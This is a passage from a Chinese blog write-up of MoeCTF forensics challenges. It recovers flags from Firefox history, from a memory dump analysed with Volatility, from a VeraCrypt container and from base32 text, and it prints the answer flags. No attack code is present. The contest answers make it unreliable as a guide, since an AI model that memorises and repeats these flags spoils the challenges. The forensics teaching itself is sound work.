<p>base64解码获得flag</p>
<pre class="line-numbers language-none"><code class="language-none">moectf&#123;Bas1c_D15k_F0r3ns1cs!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="坚持访问的浏览器"><a href="#坚持访问的浏览器" class="headerlink" title="坚持访问的浏览器"></a>坚持访问的浏览器</h2><p>查询资料后发现在 ~&#x2F;.mozilla&#x2F;firefox&#x2F;…….. 下有个places.sqlite存储浏览器的历史记录和标签。</p>
<p>然后 moz_places表中存储网站url 标题等相关信息</p>
<p>在这个表中发现了<a target="_blank" rel="noopener" href="https://hymint.space/~koito/">https://hymint.space/~koito/</a> 这个网站，尝试访问一下发现打开了，没什么功能</p>
<p>f12找到了flag</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!--
  I am always thinking about creating a flag that is safe enough.
  I came up with lots of ideas and moectf&#123;Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4&#125;
  Next step is to hide it into this page!
--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="锁定起来的同人文"><a href="#锁定起来的同人文" class="headerlink" title="锁定起来的同人文"></a>锁定起来的同人文</h2><p>一开始不太懂dumpmem.raw和qaq.hc 是什么文件，搜索了一下后发现一个是内存镜像，一个是用VeraCrypt加密的文件。然后找到了这个内存软件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility3/">https://github.com/volatilityfoundation/volatility3/</a> </p>
<pre class="line-numbers language-none"><code class="language-none">volatility_2.6_win64_standalone.exe -f dumpmem.raw --profile Win2016x64_14393 filescan | findstr &#x2F;R &quot;txt png jpg gif zip rar 7z pdf doc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>找到一个key 0x958246a8c550	\Users\Administrator\Desktop\key_pixiv_id105614615.png	，但是dumpfile不下来，翻了很多issue还有试过换3,也是dump不下来</p>
<p>一开始考虑到图片下载网站略缩图的原因，可能我根据id搜下载下来的key不正确，最后dumpfile没有思路的时候，试了一下搜索下载当key，然后解出来了</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv3744376/">https://www.bilibili.com/read/cv3744376/</a> p站搜id的方法</p>
<p><a target="_blank" rel="noopener" href="http://www.pixiv.net/member.php?id=105614615">http://www.pixiv.net/member.php?id=105614615</a> 搜到了图片 解密了.hc文件</p>
<p>tmp目录下发现 history.db siyuan.db还有pandoc，搜了一下pandoc是一个文档转换的程序，siyuan是一个插件，在siyuan.db中的 block_fts_content中发现了.sy的文件名还有内容</p>
<p>NVXWKY3UMZ5VGMC7MQZTG4DMPFPUQMLEMRSW4IL5 这像是某种编码，根据搜索编码特征后，发现是base32</p>
<p><a target="_blank" rel="noopener" href="https://www.lzltool.cn/Tools/Base32Decode">https://www.lzltool.cn/Tools/Base32Decode</a></p>
<p>解密后得到flag </p>
<pre class="line-numbers language-none"><code class="language-none">moectf&#123;S0_d33ply_H1dden!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>ww，moectf学到挺多东西的捏，入门了re和pwn，后面比较忙就没有继续做了qaq</p>

	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2023/12/28/GeekChallenge2023/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/12/28/newstar2023-week1/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-12-28 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>51</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
